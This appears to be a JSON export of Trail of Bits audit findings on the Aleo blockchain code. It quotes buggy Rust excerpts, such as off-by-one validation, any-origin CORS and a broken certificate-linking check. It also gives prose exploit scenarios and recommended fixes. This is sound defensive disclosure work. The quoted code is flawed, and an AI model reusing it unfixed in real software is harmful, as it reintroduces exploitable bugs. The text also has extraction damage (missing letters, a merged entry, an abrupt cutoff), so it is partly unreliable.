        "body": "The Committee::new function is used to construct Committee structures, and it ensures that some invariants are upheld. On the other hand, the new_genesis function is specically designed to create genesis committees and ensures that the number of committee members equals four. However, the Committee::new function can also be used to create genesis committees by dening the starting round as zero, but it allows committees with an arbitrary number of elements (as long as it exceeds three). This allows genesis committees with more than four members to be created. pub fn new(starting_round: u64, members: IndexMap<Address<N>, (u64, bool)>) -> Result<Self> { // Ensure there are at least 4 members. ensure!(members.len() >= 4, \"Committee must have at least 4 members\"); // Ensure all members have the minimum required stake. ensure!( members.values().all(|(stake, _)| *stake >= MIN_VALIDATOR_STAKE), \"All members must have at least {MIN_VALIDATOR_STAKE} microcredits in stake\" ); // Compute the total stake of the committee for this round. let total_stake = Self::compute_total_stake(&members)?; // Return the new committee. Ok(Self { starting_round, members, total_stake }) } Figure 17.1: ledger/committee/src/lib.rs#L56-L68 Recommendations Short term, add a check to the Committee::new function to ensure that when it is called with the starting round equal to zero, the number of members must be four.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "18. GitHub CI actions versions are not pinned ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The GitHub Actions pipelines do not have versions pinned. A security incident in any of the used GitHub accounts or organizations who own those pipelines can lead to a compromise of the CI/CD pipeline, any secrets they use, and any artifacts they produce. The following actions do not have their versions pinned:  KyleMayes/install-llvm-action@v1  actions-rs/toolchain@v1  actions/checkout@v1  battila7/get-version-action@v2  softprops/action-gh-release@v1 Note that we included GitHub actions from organizations, such as GitHub Actions itself, even though they are veried and already implicitly trusted by virtue of using their software. However, if any of their repositories get hacked, the risk is still there. Exploit Scenario A private GitHub account with write permissions of one of the GitHub actions whose version is not pinned is taken over by social engineering. For example, a user might use an already leaked password and is convinced to send a 2FA code to the attacker. The attacker updates the GitHub action to include code to change the release build artifacts and include a backdoor to it. Recommendations Short term, pin all external and third-party actions to a Git commit hash. Avoid pinning to a Git tag, as these can be overwritten. Also, use the pin-github-action tool to manage pinned actions. GitHub Dependabot is capable of updating GitHub actions that use commit hashes. Long term, regularly audit all pinned actions or replace them with a custom implementation.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. The committee sorting tests do not consider whether the validator is open to staking ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The code that sorts committee members follows two criteria: the (stake, is_open) tuple and, for tiebreaks, the addresss x-coordinate. /// Returns the committee members sorted by stake in decreasing order. /// For members with matching stakes, we further sort by their address' x-coordinate in decreasing order. /// Note: This ensures the method returns a deterministic result that is SNARK-friendly. fn sorted_members(&self) -> indexmap::map::IntoIter<Address<N>, (u64, bool)> { Figure 19.1: ledger/committee/src/lib.rs#L187-L190 However, neither the documentation nor the tests consider whether the is_open tuple eld is involved in the sorting. fn sorted_members(&self) -> indexmap::map::IntoIter<Address<N>, (u64, bool)> { let members = self.members.clone(); members.sorted_unstable_by(|address1, stake1, address2, stake2| { // Sort by stake in decreasing order. let cmp = stake2.cmp(stake1); // If the stakes are equal, sort by x-coordinate in decreasing order. Figure 19.2: ledger/committee/src/lib.rs#L190-L195 In particular, the sorting validation test fails if all committee members have the same stake: /// Samples a committee where all validators have the same stake. pub fn sample_committee_equal_stake_committee(num_members: u16, rng: &mut TestRng) -> Committee<CurrentNetwork> { assert!(num_members >= 4); // Sample the members. let mut members = IndexMap::new(); // Add in the minimum and maximum staked nodes. members.insert(Address::<CurrentNetwork>::new(rng.gen()), (MIN_VALIDATOR_STAKE, false)); while members.len() < num_members as usize - 1 { let stake = MIN_VALIDATOR_STAKE as f64; let is_open = rng.gen(); members.insert(Address::<CurrentNetwork>::new(rng.gen()), (stake as u64, is_open)); } // Return the committee. Committee::<CurrentNetwork>::new(1, members).unwrap() } Figure 19.3: This function samples a committee where all validators have the same stake. #[test] fn test_sorted_members() { // Initialize the RNG. let rng = &mut TestRng::default(); // Sample a committee. let committee = crate::test_helpers::sample_committee_equal_stake_committee(200, rng); // Start a timer. let timer = std::time::Instant::now(); // Sort the members. let sorted_members = committee.sorted_members().collect::<Vec<_>>(); println!(\"sorted_members: {}ms\", timer.elapsed().as_millis()); // Check that the members are sorted based on our sorting criteria. for i in 0..sorted_members.len() - 1 { let (address1, (stake1, _)) = sorted_members[i]; let (address2, (stake2, _)) = sorted_members[i + 1]; assert!(stake1 >= stake2); if stake1 == stake2 { assert!(address1.to_x_coordinate() > address2.to_x_coordinate()); } } } // running 1 test // Initializing 'TestRng' with seed '11808758482616183678' // sorted_members: 0ms // thread 'tests::test_sorted_members' panicked at 'assertion failed: address1.to_x_coordinate() > address2.to_x_coordinate()', ledger/committee/src/lib.rs:379:17 // stack backtrace: // ... // test tests::test_sorted_members ... FAILED Figure 19.4: The test that panics due to the discrepancy between the sorting expectation and implementation. Recommendations Short term, x the test to include the correct tiebreaking mechanism using the is_open ag from the validator.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "20. Impossible match case in authority verication routine ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The Block::verify_authority function validates the block authority to ensure that it is a beacon when the expected height is zero. However, due to the saturating addition, the expected_height variable is never zero, so the corresponding match branch is never taken. /// Ensures the block authority is correct. fn verify_authority( &self, previous_round: u64, previous_height: u32, current_committee: &Committee<N>, ) -> Result<(u64, u32, i64)> { // Determine the expected height. let expected_height = previous_height.saturating_add(1); // Ensure the block type is correct. match expected_height == 0 { true => ensure!(self.authority.is_beacon(), \"The genesis block must be a beacon block\"), false => { #[cfg(not(any(test, feature = \"test\")))] ensure!(self.authority.is_quorum(), \"The next block must be a quorum block\"); } } Figure 20.1: ledger/block/src/verify.rs#L124-L140 Recommendations Short term, rework the logic so that the function checks genesis blocks for the correct authority.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "21. The BFT::is_linked function does not properly determine whether two certicates are linked ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The purpose of the is_linked function is to determine whether two certicates are linked by a path of certicates. However, due to a mistyped implementation, the function will almost always return false (unless forged certicates are provided). To determine whether two certicates are linked, the function starts with the current certicate and iterates backward starting at round-1 to fetch certicates. Then, it retains only those certicates that have the current certicate as a previous certicate ID. This should never happen since the current round certicate will never be a previous certicate for a certicate in a previous round. Instead, the function should retain the certicates in the previous round that are in any of the current round (traversal) previous certicates. /// Returns `true` if there is a path from the previous certificate to the current certificate. fn is_linked( &self, previous_certificate: BatchCertificate<N>, current_certificate: BatchCertificate<N>, ) -> Result<bool> { // Initialize the list containing the traversal. let mut traversal = vec![current_certificate.clone()]; // Iterate over the rounds from the current certificate to the previous certificate. for round in (previous_certificate.round()..current_certificate.round()).rev() { // Retrieve all of the certificates for this past round. let Some(certificates) = self.dag.read().get_certificates_for_round(round) else { // This is a critical error, as the traversal should have these certificates. // If this error is hit, it is likely that the maximum GC rounds should be increased. bail!(\"BFT failed to retrieve the certificates for past round {round}\"); }; // Filter the certificates to only include those that are in the traversal. traversal = certificates .into_values() .filter(|c| traversal.iter().any(|p| c.previous_certificate_ids().contains(&p.certificate_id()))) .collect(); } Figure 21.1: node/narwhal/src/bft.rs#L595-L616 The Aleo team has acknowledged that this implementation is wrong and that the call to this function needs to be removed to ensure the protocol safely advances and syncs properly. We ran the test coverage tool cargo-llvm-cov to determine whether this function had been tested, and we noticed that the tests do not cover a large portion of the BFT::update_dag function, which in turn calls the BFT::is_linked function. Other functions such as BFT::order_dag_with_dfs are also not fully covered by tests. Recommendations Short term, update the implementation to x or remove the BFT::is_linked function. Long term, run a test coverage reporting tool such as cargo-llvm-cov to determine limitations in the test coverage of essential protocol functionality; add tests accordingly.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "22. Peer is not removed from connecting_peers when handshake times out ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "During the handshake, the peer IP is added into the collection of connecting peers in the ensure_peer_is_allowed function (gure 22.1), and it is then removed from that collection after the handshake (gure 22.2). However, since the whole handshake ow is performed with a timeout by the thread spawned in the enable_handshake function (gure 22.3), the peer IP may not be removed from the collection on time. If a peer IP is still in the collection when it should not be, this would result in an unexpected state. We tested this scenario by modifying the code so that the ensure_peer_is_allowed function always bails out, and we put the thread into sleep for 10 seconds. We then observed that the peer IP was still in the connecting_peers collection after the handshake timed out. impl<N: Network> Router<N> { fn ensure_peer_is_allowed(&self, peer_ip: SocketAddr) -> Result<()> { ... // Ensure the node is not already connecting to this peer. if !self.connecting_peers.lock().insert(peer_ip) { bail!(\"Dropping connection request from '{peer_ip}' (already shaking hands as the initiator)\") } Figure 22.1: node/router/src/handshake.rs#L244-L253 impl<N: Network> Router<N> { pub async fn handshake<'a>(/* ... */) -> /* ... */ { ... // Perform the handshake; we pass on a mutable reference to peer_ip in case the process is broken at any point in time. let handshake_result = if peer_side == ConnectionSide::Responder { self.handshake_inner_initiator(peer_addr, &mut peer_ip, stream, genesis_header).await } else { self.handshake_inner_responder(peer_addr, &mut peer_ip, stream, genesis_header).await }; // Remove the address from the collection of connecting peers (if the handshake got to the point where it's known). if let Some(ip) = peer_ip { self.connecting_peers.lock().remove(&ip); } Figure 22.2: node/router/src/handshake.rs#L105-L108 async fn enable_handshake(&self) { ... tokio::spawn(async move { debug!(parent: node.tcp().span(), \"shaking hands with {} as the {:?}\", addr, !conn.side()); let result = timeout(Duration::from_millis(Self::TIMEOUT_MS), node.perform_handshake(conn)).await; Figure 22.3: node/tcp/src/protocols/handshake.rs#L45-L63 Recommendations Short term, change the logic so that if the handshake times out, the peer IP is properly removed from the connecting_peers collection. Long term, add tests to ensure that all timeouts perform the expected cleanup properly when the timeout happens.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "23. Rest API allows any origin ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "When the node hosts its rest API, it spawns the server and sets its Cross-Origin Resource Sharing (CORS) settings so that any origin can access it. As a result, if a user hosts the node on their desktop computer, an attacker can create a website that will spam the users API. impl<N: Network, C: ConsensusStorage<N>, R: Routing<N>> Rest<N, C, R> { fn spawn_server(&mut self, rest_ip: SocketAddr) { let cors = CorsLayer::new() .allow_origin(Any) .allow_methods([Method::GET, Method::POST, Method::OPTIONS]) .allow_headers([CONTENT_TYPE]); Figure 23.1: node/rest/src/lib.rs#L94-L99 Exploit Scenario An attacker prepares a website that spams the broadcast transaction endpoint to make a users node broadcast to other nodes with invalid transactions. Recommendations Short term, allow users to set the CORS settings when conguring the node. Additionally, consider adding authentication for the broadcast transaction endpoint. (The API authentication is currently commented out in the codebase.)",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "24. Garbage collection does not collect the next_gc_round ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The garbage collection routine implemented in the Storage::update_current_round function does not remove old certicates up to self.gc_round, contrary to what is stated in the structures eld description: /// The `round` for which garbage collection has occurred **up to** (inclusive). gc_round: Arc<AtomicU64>, Figure 24.1: node/narwhal/src/helpers/storage.rs#L55-L56 if next_gc_round > current_gc_round { // Remove the GC round(s) from storage. for gc_round in current_gc_round..next_gc_round { // Iterate over the certificates for the GC round. for certificate in self.get_certificates_for_round(gc_round).iter() { // Remove the certificate from storage. self.remove_certificate(certificate.certificate_id()); } } // Update the GC round. self.gc_round.store(next_gc_round, Ordering::SeqCst); Figure 24.2: node/narwhal/src/helpers/storage.rs#L160-L170 Recommendations Short term, make the garbage collection include the next_gc_round by iterating in current_gc_round..=next_gc_round. Long term, add garbage collection tests to ensure that the correct rounds are removed in the correct round. 25. Fee verication is o\u0000 by one Severity: Informational Diculty: N/A Type: Data Validation Finding ID: TOB-ALEO-25 Target: synthesizer/src/vm/verify.rs",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "26. Potential block reward truncation and overow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The code documentation for block rewards species that the value of annual_reward should equal 0.05 * S, where S is the current total supply. The implementation determines the annual reward by computing (total_supply / 1000) * 50. This computation will return an incorrect result, zero, as soon as the value of total_supply is below 1000. Computing the annual reward with (total_supply / 100) * 5 would result in the correct percentage, except for values below 100. /// Calculate the block reward, given the total supply, block time, and coinbase reward. /// /// /// /// pub const fn block_reward(total_supply: u64, block_time: u16, coinbase_reward: u64) -> u64 { R_staking = floor((0.05 * S) / H_Y1) + CR / 2 S = Total supply. H_Y1 = Expected block height at year 1. CR = Coinbase reward. // Compute the expected block height at year 1. let block_height_at_year_1 = block_height_at_year(block_time, 1); // Compute the annual reward: (0.05 * S). let annual_reward = (total_supply / 1000) * 50; // Compute the block reward: (0.05 * S) / H_Y1. let block_reward = annual_reward / block_height_at_year_1 as u64; // Return the sum of the block and coinbase rewards. block_reward + coinbase_reward / 2 } Figure 26.1: ledger/block/src/helpers/target.rs#L20-L34 Also, the result of block_reward + coinbase_reward / 2 can overow and lead to a smaller than expected block reward. // Return the sum of the block and coinbase rewards. block_reward + coinbase_reward / 2 } Figure 26.2: ledger/block/src/helpers/target.rs#L32-L34 Recommendations Short term, use the suggested strategy to compute the annual_reward, or document why the current one is preferred. Add a call to the checked_add function to safely perform the total block reward sum while checking for overows.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "27. Saturated additions and subtractions can cause inconsistencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The Cache structure uses a u16 to track counts for cached items, which the router uses to track outbound puzzle requests. Counts are incremented and decremented using the saturating_add and saturating_sub methods. fn increment_counter<K: Hash + Eq>(map: &RwLock<HashMap<K, u16>>, key: K) -> u16 { let mut map_write = map.write(); // Load the entry for the key, and increment the counter. let entry = map_write.entry(key).or_default(); *entry = entry.saturating_add(1); // Return the updated counter. *entry } [...] fn decrement_counter<K: Copy + Hash + Eq>(map: &RwLock<HashMap<K, u16>>, key: K) -> u16 { let mut map_write = map.write(); // Load the entry for the key, and decrement the counter. let entry = map_write.entry(key).or_default(); let value = entry.saturating_sub(1); // If the entry is 0, remove the entry. if *entry == 0 { map_write.remove(&key); } else { *entry = value; } // Return the updated counter. value } Figure 27.1: node/router/src/helpers/cache.rs If an addition saturates, subsequent subtractions can cause the count to hit zero while outbound puzzle requests are still outstanding. In that case, the contains_outbound_puzzle_requests method will incorrectly return false. As currently congured, it does not appear possible to trigger this condition; puzzle requests are rate limited, and the cache automatically ages o old values at a rate that should prevent a u16 from reaching saturation. However, if the code were to be reused elsewhere, or the timeout values were to change as part of a scaling eort, incorrect tracking could result. Additionally, in a multithreaded scenario, it is possible for puzzle requests to become backed up while the cache is locked, causing a large number of requests to be processed at once; this may lead to saturation and incorrect results. Note that the cache code is also present in the version of node/narwhal/src/helpers/cache.rs reviewed during the audit. As of the time of this writing, that code has been refactored in a way that obviates this issue. We reference it here for completeness. Recommendations Short term, update to a larger integer type, such as u32 or u64. Alternatively, ensure that the saturation conditions are well documented in case of reuse. Long term, add error-handling code to the increment_counter and decrement_counter functions to handle the saturation cases.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "28. IndexSet::remove does not preserve the order of the IndexSet ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The IndexSet::remove function changes the order of the index set. This behavior might result in an unintended order of the index sets. For example, Storages rounds will stop being in insertion order after a removal. /// Removes the given `certificate ID` from storage. /// /// This method triggers updates to the `rounds`, `certificates`, `batch_ids`, and `transmissions` maps. /// /// If the certificate was successfully removed, `true` is returned. /// If the certificate did not exist in storage, `false` is returned. pub fn remove_certificate(&self, certificate_id: Field<N>) -> bool { Figure 28.1: node/narwhal/src/helpers/storage.rs#L508-L514 All current uses of the IndexSet::remove seem benign; however, the rounds_iter function does iterate over that set. /// Returns an iterator over the `(round, (certificate ID, batch ID, author))` entries. pub fn rounds_iter(&self) -> impl Iterator<Item = (u64, IndexSet<(Field<N>, Field<N>, Address<N>)>)> { self.rounds.read().clone().into_iter() } Figure 28.2: node/narwhal/src/helpers/storage.rs#677680 Recommendations Short term, identify every use of IndexSet::remove and IndexMap::remove, determine whether its use is appropriate, and either document it or replace it with the shift_remove function. Rename the instances of remove that remain in the code to the equivalent function named swap_remove. Alternatively, replace IndexSet with HashSet where possible.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "29. The batch certicate ID calculation does not include the number of signatures in the preimage ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The batch certicate ID calculation does not include the number of signatures in the preimage. impl<N: Network> BatchCertificate<N> { /// Returns the certificate ID. pub fn compute_certificate_id(batch_id: Field<N>, signatures: &IndexMap<Signature<N>, i64>) -> Result<Field<N>> { let mut preimage = Vec::new(); // Insert the batch ID. batch_id.write_le(&mut preimage)?; // Insert the signatures. for (signature, timestamp) in signatures { // Insert the signature. signature.write_le(&mut preimage)?; // Insert the timestamp. timestamp.write_le(&mut preimage)?; } // Hash the preimage. N::hash_bhp1024(&preimage.to_bits_le()) } } Figure 29.2: ledger/narwhal/batch-certificate/src/lib.rs#L150-L166 This contrasts with other functions that also include the arrays length in the hash preimage. impl<N: Network> BatchHeader<N> { /// Returns the batch ID. pub fn compute_batch_id( author: Address<N>, round: u64, timestamp: i64, transmission_ids: &IndexSet<TransmissionID<N>>, previous_certificate_ids: &IndexSet<Field<N>>, ) -> Result<Field<N>> { let mut preimage = Vec::new(); // Insert the author. author.write_le(&mut preimage)?; // Insert the round number. round.write_le(&mut preimage)?; // Insert the timestamp. timestamp.write_le(&mut preimage)?; // Insert the number of transmissions. u64::try_from(transmission_ids.len())?.write_le(&mut preimage)?; // Insert the transmission IDs. for transmission_id in transmission_ids { transmission_id.write_le(&mut preimage)?; } // Insert the number of previous certificate IDs. u64::try_from(previous_certificate_ids.len())?.write_le(&mut preimage)?; // Insert the previous certificate IDs. for certificate_id in previous_certificate_ids { // Insert the certificate ID. certificate_id.write_le(&mut preimage)?; } // Hash the preimage. N::hash_bhp1024(&preimage.to_bits_le()) } } Figure 29.1: ledger/narwhal/batch-header/src/to_id.rs#L30-L62 Recommendations Short term, add the number of signatures to the hash preimage.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "30. Missing validations in block metadata and header validation functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The block header metadata validation function does not include checks for the cumulative_weight and proof_targets variables, and the last_coinbase_timestamp and block header timestamp variables are not compared. /// Returns `true` if the block metadata is well-formed. pub fn is_valid(&self) -> bool { match self.height == 0u32 { true => self.is_genesis(), false => { // Ensure the network ID is correct. self.network == N::ID // Ensure the round is nonzero. && self.round != 0u64 // Ensure the height is nonzero. && self.height != 0u32 // Ensure the round is at least as large as the height. && self.round >= self.height as u64 // Ensure the coinbase target is at or above the minimum. && self.coinbase_target >= N::GENESIS_COINBASE_TARGET // Ensure the proof target is at or above the minimum. && self.proof_target >= N::GENESIS_PROOF_TARGET // Ensure the coinbase target is larger than the proof target. && self.coinbase_target > self.proof_target // Ensure the last coinbase target is at or above the minimum. && self.last_coinbase_target >= N::GENESIS_COINBASE_TARGET // Ensure the last coinbase timestamp is after the genesis timestamp. && self.last_coinbase_timestamp >= N::GENESIS_TIMESTAMP // Ensure the timestamp in the block is after the genesis timestamp. && self.timestamp > N::GENESIS_TIMESTAMP Figure 30.1: ledger/block/src/header/metadata/mod.rs#L89-L113 The block header validation function is missing a non-zero validation for the solutions_root eld element: /// The header for the block contains metadata that uniquely identifies the block. #[derive(Copy, Clone, PartialEq, Eq, Hash)] pub struct Header<N: Network> { /// The Merkle root representing the blocks in the ledger up to the previous block. previous_state_root: N::StateRoot, /// The Merkle root representing the transactions in the block. transactions_root: Field<N>, /// The Merkle root representing the on-chain finalize including the current block. finalize_root: Field<N>, /// The Merkle root representing the ratifications in the block. ratifications_root: Field<N>, /// The solutions root of the puzzle. solutions_root: Field<N>, /// The metadata of the block. metadata: Metadata<N>, } Figure 30.2: ledger/block/src/header/mod.rs#3247 /// Returns `true` if the block header is well-formed. pub fn is_valid(&self) -> bool { match self.height() == 0u32 { true => self.is_genesis(), false => { // Ensure the previous ledger root is nonzero. *self.previous_state_root != Field::zero() // Ensure the transactions root is nonzero. && self.transactions_root != Field::zero() // Ensure the finalize root is nonzero. && self.finalize_root != Field::zero() // Ensure the ratifications root is nonzero. && self.ratifications_root != Field::zero() // Ensure the metadata is valid. && self.metadata.is_valid() } } } Figure 30.3: ledger/block/src/header/mod.rs#7592 Recommendations Short term, determine whether such validations are necessary. If so, include them; otherwise, add code comments describing why those structure elds do not need validation.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "2. Faulty validation enables more than the intended number of inputs on nalize commands ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "The add_input functions for the FinalizeCore and ClosureCore structures allow one element to be inserted above the N::MAX_INPUTS value due to an o-by-one error in the inequality. The inequality should check whether the current number of inputs is less than N::MAX_INPUTS, but in the current implementation, the validation allows nalize and closure statements with N::MAX_INPUTS + 1 elements. #[inline] fn add_input(&mut self, input: Input<N>) -> Result<()> { // Ensure there are no commands in memory. ensure!(self.commands.is_empty(), \"Cannot add inputs after commands have been added\"); // Ensure the maximum number of inputs has not been exceeded. ensure!(self.inputs.len() <= N::MAX_INPUTS, \"Cannot add more than {} inputs\", N::MAX_INPUTS); Figure 2.1: synthesizer/program/src/finalize/mod.rs#8995 #[inline] fn add_input(&mut self, input: Input<N>) -> Result<()> { // Ensure there are no instructions or output statements in memory. ensure!(self.instructions.is_empty(), \"Cannot add inputs after instructions have been added\"); ensure!(self.outputs.is_empty(), \"Cannot add inputs after outputs have been added\"); // Ensure the maximum number of inputs has not been exceeded. ensure!(self.inputs.len() <= N::MAX_INPUTS, \"Cannot add more than {} inputs\", N::MAX_INPUTS); Figure 2.2: synthesizer/program/src/closure/mod.rs#7986 Recommendations Short term, modify the checks to validate the maximum number of allowed inputs to prevent the o-by-one error. Long term, add positive and negative tests for these invariants: tests that fail because they have one too many inputs, and tests that pass because they have exactly the allowed number of inputs.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "3. Parsing di\u0000erences between the aleo.abnf grammar and the implementation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-aleo-securityreview.pdf",
        "body": "We have identied several dierences between the formal grammar in the aleo.abnf le and the Rust implementation. Missing finalize-output tokens: The grammar allows zero or more finalize-output tokens in the finalize statement, but the finalize implementation has no output statements. finalize = cws %s\"finalize\" ws identifier ws \":\" *finalize-input 1*command *finalize-output Figure 3.1: aleo.abnf#452455 // Parse the inputs from the string. let (string, inputs) = many0(Input::parse)(string)?; // Parse the commands from the string. let (string, commands) = many1(Command::parse)(string)?; map_res(take(0usize), move |_| { // Initialize a new finalize. let mut finalize = Self::new(name); if let Err(error) = inputs.iter().cloned().try_for_each(|input| finalize.add_input(input)) { eprintln!(\"{error}\"); return Err(error); } if let Err(error) = commands.iter().cloned().try_for_each(|command| finalize.add_command(command)) { eprintln!(\"{error}\"); return Err(error); } Ok::<_, Error>(finalize) })(string) Figure 3.2: synthesizer/program/src/finalize/parse.rs#34 Missing validation of number of command tokens: The FromBytes implementation for finalize does not validate that there is at least one command: // Read the commands. let num_commands = u16::read_le(&mut reader)?; if num_commands > u16::try_from(N::MAX_COMMANDS).map_err(|e| error(e.to_string()))? { return Err(error(format!(\"Failed to deserialize finalize: too many commands ({num_commands})\"))); } let mut commands = Vec::with_capacity(num_commands as usize); for _ in 0..num_commands { commands.push(Command::read_le(&mut reader)?); } Figure 3.3: synthesizer/program/src/finalize/bytes.rs#3139 Unimplemented finalize-type for inputs: The grammar allows two extra finalize-types that are not taken into account in the implementation: finalize-input = cws %s\"input\" ws register ws %s\"as\" ws finalize-type ws \";\" Figure 3.4: aleo.abnf#457458 finalize-type = plaintext-type %s\".public\" / identifier %s\".record\" / locator %s\".record\" Figure 3.5: aleo.abnf#254256 // Parse the plaintext type from the string. let (string, (plaintext_type, _)) = pair(PlaintextType::parse, tag(\".public\"))(string)?; Figure 3.6: synthesizer/program/src/finalize/input/parse.rs#4546 Unimplemented finalize-type for mapping key and value: The grammar uses the same finalize-type for the mapping key and value: mapping-key = cws %s\"key\" ws identifier ws %s\"as\" ws finalize-type ws \";\" mapping-value = cws %s\"value\" ws identifier ws %s\"as\" ws finalize-type ws \";\" Figure 3.7: aleo.abnf#274276 However, the implementation considers only the .public type. // Parse the plaintext type from the string. let (string, (plaintext_type, _)) = pair(PlaintextType::parse, tag(\".public\"))(string)?; Figure 3.8: synthesizer/program/src/mapping/key/parse.rs#3536 // Parse the plaintext type from the string. let (string, (plaintext_type, _)) = pair(PlaintextType::parse, tag(\".public\"))(string)?; Figure 3.9: synthesizer/program/src/mapping/value/parse.rs#3536 Empty inputs on closures: The closure grammar does not enforce non-empty inputs: closure = cws %s\"closure\" ws identifier ws \":\" *closure-input 1*instruction *closure-output Figure 3.10: aleo.abnf#427430 However, the implementation does: // Ensure there are input statements in the closure. ensure!(!closure.inputs().is_empty(), \"Cannot evaluate a closure without input statements\"); Figure 3.11: synthesizer/program/src/lib.rs#254255 Missing keyword on branches: The branch grammar is missing the to keyword: branch = cws branch-op ws operand ws operand ws label ws \";\" Figure 3.12: aleo.abnf#411 impl<N: Network, const VARIANT: u8> Parser for Branch<N, VARIANT> { /// Parses a string into an command. #[inline] fn parse(string: &str) -> ParserResult<Self> { // Parse the whitespace and comments from the string. let (string, _) = Sanitizer::parse(string)?; // Parse the opcode from the string. let (string, _) = tag(*Self::opcode())(string)?; // Parse the whitespace from the string. let (string, _) = Sanitizer::parse_whitespaces(string)?; // Parse the first operand from the string. let (string, first) = Operand::parse(string)?; // Parse the whitespace from the string. let (string, _) = Sanitizer::parse_whitespaces(string)?; // Parse the second operand from the string. let (string, second) = Operand::parse(string)?; // Parse the whitespace from the string. let (string, _) = Sanitizer::parse_whitespaces(string)?; // Parse the \"to\" from the string. let (string, _) = tag(\"to\")(string)?; // Parse the whitespace from the string. let (string, _) = Sanitizer::parse_whitespaces(string)?; // Parse the position from the string. let (string, position) = Identifier::parse(string)?; // Parse the whitespace from the string. let (string, _) = Sanitizer::parse_whitespaces(string)?; // Parse the \";\" from the string. let (string, _) = tag(\";\")(string)?; Ok((string, Self { first, second, position })) } } Figure 3.13: synthesizer/program/src/logic/command/branch.rs#69104 Missing whitespace token on rand_chacha: The rand_chacha grammar is missing a whitespace token between the as token and the literal-type token: random = cws %s\"rand.chacha\" *2( ws operand ) ws %s\"into\" ws register ws %s\"as\" literal-type ws \";\" Figure 3.14: aleo.abnf#400403 let (string, _) = tag(\"as\")(string)?; // Parse the whitespace from the string. let (string, _) = Sanitizer::parse_whitespaces(string)?; // Parse the destination register type from the string. let (string, destination_type) = LiteralType::parse(string)?; Figure 3.15: synthesizer/program/src/logic/command/rand_chacha.rs#169173 Optional destinations on call: The call implementation allows optional destinations, but the grammar enforces that there must be at least one: call = %s\"call\" ws ( locator / identifier ) ws *( ws operand ) ws %s\"into\" ws 1*( ws register ) Figure 3.16: aleo.abnf#365366 // Optionally parse the \"into\" from the string. let (string, destinations) = match opt(tag(\"into\"))(string)? { // If the \"into\" was not parsed, return the string and an empty vector of destinations. (string, None) => (string, vec![]), // If the \"into\" was parsed, parse the destinations from the string. (string, Some(_)) => { // Parse the whitespace from the string. let (string, _) = Sanitizer::parse_whitespaces(string)?; // Parse the destinations from the string. let (string, destinations) = map_res(many0(complete(parse_destination)), |destinations: Vec<Register<N>>| { // Ensure the number of destinations is within the bounds. match destinations.len() <= N::MAX_OPERANDS { true => Ok(destinations), false => Err(error(\"Failed to parse 'call' opcode: too many destinations\")), } })(string)?; // Return the string and the destinations. (string, destinations) } }; Figure 3.17: synthesizer/program/src/logic/instruction/operation/call.rs#306326 Grammar missing sign.verify instruction: The sign.verify instruction is missing from the grammar. Opcode::Sign => &\"sign.verify\", Figure 3.18: synthesizer/program/src/logic/instruction/opcode/mod.rs#57 Discrepancy in operand number on hash: The hash grammar enforces exactly one operand, but the implementation allows for two: hash = hash-op ws operand ws %s\"into\" ws register ws %s\"as\" ws ( arithmetic-type / address-type ) Figure 3.19: aleo.abnf#358360 /// Returns the expected number of operands given the variant. const fn expected_num_operands(variant: u8) -> usize { match variant { 9..=11 => 2, _ => 1, } } Figure 3.20: synthesizer/program/src/logic/instruction/operation/hash.rs#68 // Parse the operands from the string. let (string, operands) = parse_operands(string, expected_num_operands(VARIANT))?; Figure 3.21: synthesizer/program/src/logic/instruction/operation/hash.rs#315316 Missing whitespace separation between operand parsing: The operand parser for hash instructions does not separate each operand with a whitespace. fn parse_operands<N: Network>(string: &str, num_operands: 